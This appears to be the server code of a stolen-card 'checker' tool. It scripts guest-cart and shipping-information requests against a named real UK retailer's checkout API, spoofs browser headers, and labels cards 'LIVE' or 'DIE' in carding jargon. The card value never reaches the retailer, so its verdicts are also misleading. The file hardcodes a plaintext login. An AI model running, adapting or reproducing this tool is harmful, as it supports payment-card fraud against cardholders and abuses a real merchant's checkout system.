import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import { wrapper } from "axios-cookiejar-support";
import { CookieJar } from "tough-cookie";
import cors from "cors";

// Use axios with cookie support
const axiosClient = wrapper(axios.create());

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  // Auth endpoint (dummy for now, logic on client)
  app.post("/api/login", (req, res) => {
    const { username, password } = req.body;
    if (username === "reset" && password === "336498") {
      res.json({ success: true, token: "auth_token_" + Date.now() });
    } else {
      res.status(401).json({ success: false, message: "Invalid credentials" });
    }
  });

  // Card validation endpoint
  app.post("/api/validate", async (req, res) => {
    const { card, address } = req.body;
    const jar = new CookieJar();
    
    try {
      // 1. Visit home to get initial cookies
      await axiosClient.get("https://www.directwatertanks.co.uk/", { 
        jar,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
        }
      });

      // 2. Create Guest Cart
      const cartResponse = await axiosClient.post(
        "https://www.directwatertanks.co.uk/rest/directwatertanks/V1/guest-carts",
        {},
        { jar }
      );
      const cartId = cartResponse.data;

      // 3. Add a random product (SKU) to cart - required for shipping info to work
      // Using a valid SKU found on site: 'V200-S' (example)
      try {
        await axiosClient.post(
          `https://www.directwatertanks.co.uk/rest/directwatertanks/V1/guest-carts/${cartId}/items`,
          {
            cartItem: {
              sku: "V200-S",
              qty: 1,
              quote_id: cartId
            }
          },
          { jar }
        );
      } catch (e) {
        // Continue anyway, some carts might work empty or with other SKUs
      }

      // 4. Shipping Information (The core of the validation)
      const shippingPayload = {
        addressInformation: {
          shipping_address: {
            countryId: "GB",
            region: address.region,
            street: address.street,
            company: address.company,
            telephone: address.telephone,
            postcode: address.postcode,
            city: address.city,
            firstname: address.firstname,
            lastname: address.lastname
          },
          billing_address: {
            countryId: "GB",
            region: address.region,
            street: address.street,
            company: address.company,
            telephone: address.telephone,
            postcode: address.postcode,
            city: address.city,
            firstname: address.firstname,
            lastname: address.lastname,
            saveInAddressBook: null
          },
          shipping_method_code: "uk_standard",
          shipping_carrier_code: "KFD",
          extension_attributes: {
            newsletter_subscribe: true,
            kl_sms_consent: false,
            kl_email_consent: false
          }
        }
      };

      const response = await axiosClient.post(
        `https://www.directwatertanks.co.uk/rest/directwatertanks/V1/guest-carts/${cartId}/shipping-information`,
        shippingPayload,
        { 
          jar,
          headers: {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.directwatertanks.co.uk',
            'Referer': 'https://www.directwatertanks.co.uk/checkout/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }
      );

      // Se retornou 200, significa que o endereço e o checkout subiram para o próximo passo (Pagamento)
      if (response.status === 200) {
        res.json({ 
          status: "LIVE", 
          card, 
          message: "Check Verificado",
          phone: address.telephone,
          name: `${address.firstname} ${address.lastname}`
        });
      } else {
        res.json({ status: "DIE", card, message: "Step Failed" });
      }

    } catch (error: any) {
      const errorMsg = error.response?.data?.message || "Error Connecting";
      res.json({ status: "DIE", card, message: errorMsg });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
